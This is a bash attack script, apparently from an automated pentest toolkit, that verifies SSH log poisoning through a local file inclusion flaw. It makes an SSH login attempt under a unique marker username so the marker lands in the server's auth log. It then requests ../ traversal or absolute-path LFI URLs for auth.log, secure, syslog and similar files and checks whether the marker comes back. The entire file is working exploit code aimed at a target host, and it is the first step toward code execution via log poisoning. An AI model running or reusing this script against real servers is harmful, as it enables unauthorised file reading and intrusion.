#!/bin/bash
# SSH Canary Probe -- Phase 1: inject harmless marker into auth.log, verify via LFI
# 用法: canary_ssh.sh <ENDPOINT> <TARGET_IP>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"
TARGET_IP="${2:-127.0.0.1}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== SSH Canary Probe (Phase 1) ==="

SSH_PORT="${ssh_port:-22}"
if [ -z "$SSH_PORT" ] || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
  SSH_PORT=22
fi

if ! (exec 3<>/dev/tcp/"$TARGET_IP"/"$SSH_PORT") 2>/dev/null; then
  echo "[FAIL] SSH port $SSH_PORT unreachable"
  echo "SSH_CANARY_FAIL"
  exit 1
fi
exec 3>&- 3<&- 2>/dev/null || true

CANARY="PTCANARY$(date +%s)"
echo "[INFO] canary=$CANARY target=$TARGET_IP:$SSH_PORT"

SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
  -p "$SSH_PORT" "${CANARY}"@"$TARGET_IP" 2>&1 || true)
echo "$SSH_ERR" | head -2
if echo "$SSH_ERR" | grep -qi "invalid characters"; then
  if command -v nc >/dev/null 2>&1; then
    printf '%s\r\n' "$CANARY" | nc -w 2 "$TARGET_IP" "$SSH_PORT" >/dev/null 2>&1 || true
  else
    (exec 3<>/dev/tcp/"$TARGET_IP"/"$SSH_PORT" && \
     printf '%s\r\n' "$CANARY" >&3 && sleep 1 && \
     exec 3>&- 3<&-) >/dev/null 2>&1 || true
  fi
fi
sleep 2

CONFIRMED_PARAM="${lfi_param:-}"
CONFIRMED_DEPTH="${lfi_depth:-}"
LFI_STYLE="${lfi_style:-relative}"
LFI_PATH="${lfi_path:-}"
[ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
[ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"

build_lfi_url() {
  local target_file="$1"
  if [ "$LFI_STYLE" = "absolute" ]; then
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}/${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
    fi
  else
    local TRAV
    TRAV=$(printf '../%.0s' $(seq 1 "$CONFIRMED_DEPTH"))
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}${TRAV}${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
    fi
  fi
}

AUTH_LOGS="var/log/auth.log var/log/secure var/log/sshd.log var/log/messages var/log/syslog"
for logpath in $AUTH_LOGS; do
  url=$(build_lfi_url "$logpath")
  echo "[READ] $url"
  result=$(curl -s "$url" --max-time 8 2>/dev/null)
  if echo "$result" | grep -q "$CANARY"; then
    echo "[HIT] Canary echoed in $logpath"
    echo "SSH_CANARY_OK:$logpath"
    exit 0
  fi
  sz=${#result}
  echo "[MISS] $logpath (${sz}B, no canary)"
done
echo "SSH_CANARY_FAIL"
